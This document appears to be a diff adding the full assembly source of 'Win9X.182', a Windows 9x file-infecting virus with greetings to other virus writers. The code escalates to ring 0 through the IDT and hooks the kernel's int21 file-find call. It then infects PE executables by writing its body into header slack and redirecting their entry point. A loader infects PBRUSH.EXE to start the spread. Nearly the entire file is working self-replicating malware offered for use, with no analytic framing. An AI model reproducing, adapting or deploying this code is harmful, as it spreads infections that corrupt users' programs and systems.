@@ -1,0 +1,232 @@
+; Win9X.182  (c) S.S.R. /2Rats /RVA /IndependentVXer
+; Based on code of Win9X.185 by Z0MBiE
+; greetz to Z0MBiE, Zhengxi, MrSandman, Ultras, VirusBuster
+
+kernel_ord0             equ     0BFF713D4h
+kernel_int21            equ     0BFF712B9h
+kernel_i21x             equ     8
+kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))
+
+                        p386
+                        model   flat
+
+                        .code
+start:
+                        xchg    esi, eax
+
+                        push    edi
+                        sidt    [esp-2]
+                        pop     edi
+
+                        fild    qword ptr [edi]
+
+                        lea eax,[esi+r0proc-start]
+                        stosd
+                        stosd
+                        mov     [edi-8+2], 0EE000028h
+                        int     00h
+                        db 81h,0C6h
+oldeip                  dd loader-start
+                        jmp esi
+
+
+                        ; now in ring-0
+
+r0proc:                 fistp   qword ptr [edi-8]
+                        mov     ebx, kernel_int21+kernel_i21x -(hook-start-4)
+
+                        mov     eax, [ebx+hook-start-4]
+                        cmp     al, kernel_c1 and 255;alredy tsr?
+                        jne     r0exit
+                        mov     ah,20
+                        fild    qword ptr [vc1-start+esi]
+
+                        push    eax
+vc1:                    db      0CDh,20h
+                        dd      0040000Dh
+                        pop     ecx
+
+                        fistp   qword ptr [vc1-start+esi]
+
+                        mov     edi, eax
+                        rep     movsb
+                        sub     eax, ebx
+                        mov     [ebx+hook-start-4], eax
+
+r0exit:                 iret
+
+
+hook:                   push    kernel_ord0
+
+                        cmp     ax, 714Eh
+                        jne     hookexit
+
+infect:                 pusha
+
+                        mov     ebp, kernel_int21
+
+                        mov     ax, 3D02h
+                        call    ebp
+                        jc      infect_exit
+                        xchg    ebx, eax
+
+                        mov     esi, [ebp+kernel_i21x]
+                        lea     esi, [esi+ebp-(hook-start-kernel_i21x-4)]
+
+                        xor     ecx, ecx
+                        mov     ch, bufsize/256
+
+                        lea     edx, [esi+ecx]
+
+                        mov     ah, 3Fh
+                        call    ebp
+
+                        mov     ecx, [edx+3Ch]
+                        cmp     ecx, eax
+                        jae     infect_close
+
+                        add     ecx, edx
+
+                        cmp     byte ptr [ecx], 'S'
+                        jne     infect_close
+
+                        mov     eax, [ecx+54h]
+                        inc     [ecx+54h].byte ptr 1
+                        lea     edi, [edx+eax]
+                        xchg    eax, [ecx+28h]
+                        sub     eax, [ecx+28h]
+                        mov     [esi+oldeip-start], eax
+
+                        xor     ecx, ecx
+                        mov     cl, physsize
+
+                        pusha
+
+                        xor     eax, eax
+                        repz    scasb
+
+                        pushf
+                        mov     ah, 42h
+                        cdq
+                        call    ebp
+                        popf
+
+                        popa
+                        jne     infect_close
+
+                        rep     movsb
+
+                        mov     ah, 40h
+                        mov     ch, bufsize/256
+                        call    ebp
+
+infect_close:
+                        mov     ah, 3Eh
+                        call    ebp
+
+infect_exit:            popa
+
+hookexit:               ret
+
+
+physend:
+physsize                equ     $-start
+
+                        org     start+bufsize
+bufsize                 equ     4096
+buf                     db      bufsize dup (0)
+
+virtend:
+virtsize                equ     $-start
+
+; --------------------- VIRUS LOADER ----------------------------------------
+
+callW                   macro   x
+                        extrn   x:PROC
+                        call    x
+                        endm
+
+loader:
+
+; testfile --> fullname
+                        push    esp
+                        push    esp
+                        push    offset fullname
+                        push    size fullname
+                        push    offset testfile
+                        callW   GetFullPathNameA
+                        pop     ecx
+
+; open/close testfile (so it will be infected)
+                        lea     esi, fullname
+                        mov     eax, 716Ch
+                        xor     ecx, ecx
+                        mov     edx, 0001h
+                        mov     ebp, kernel_int21
+                        call    ebp
+                        xchg    ebx, eax
+                        mov     ah, 3Eh
+                        call    ebp
+
+; findfirst-access (if ONFIND defined)
+                        mov     ax, 714Eh
+                        lea     edx, fullname
+                        mov     edi, edx
+                        call    ebp
+
+; deactivate virii (unhook kernel_int21)
+                        push    edi
+                        sidt    [esp-2]
+                        pop     edi
+                        fild    qword ptr [edi]
+                        call    xxx
+                        fistp   qword ptr [edi-8]
+                        mov dword ptr ds:[kernel_int21+kernel_i21x],kernel_c1
+                        iret
+xxx:                    pop     eax
+                        stosd
+                        stosd
+                        mov     [edi-8+2], 0EE000028h
+                        int     00h
+
+; write message
+                        push    esp
+                        push    esp
+                        push    msg1_size
+                        push    offset msg1
+                        push    -11
+                        callW   GetStdHandle
+                        push    eax
+                        callW   WriteConsoleA
+
+; back to md (sucks...)
+                        push    -1
+                        callW   ExitProcess
+
+                        .data
+
+msg1                    db      'win9X.'
+                        db      physsize/ 100 mod 10+'0'
+                        db      physsize/  10 mod 10+'0'
+                        db      physsize/   1 mod 10+'0'
+                        db      ' virii loader executed',13,10
+                        db      'þ physsize = '
+                        db      physsize/1000 mod 10+'0'
+                        db      physsize/ 100 mod 10+'0'
+                        db      physsize/  10 mod 10+'0'
+                        db      physsize/   1 mod 10+'0'
+                        db      ' bytes',13,10
+                        db      'þ virtsize = '
+                        db      virtsize/1000 mod 10+'0'
+                        db      virtsize/ 100 mod 10+'0'
+                        db      virtsize/  10 mod 10+'0'
+                        db      virtsize/   1 mod 10+'0'
+                        db      ' bytes',13,10
+                        db      'þ '
+testfile                db      'PBRUSH.EXE',0
+                        db      'probably infected',13,10
+msg1_size               equ     $-msg1
+
+fullname                db      260 dup (?)
+
+                        end     start
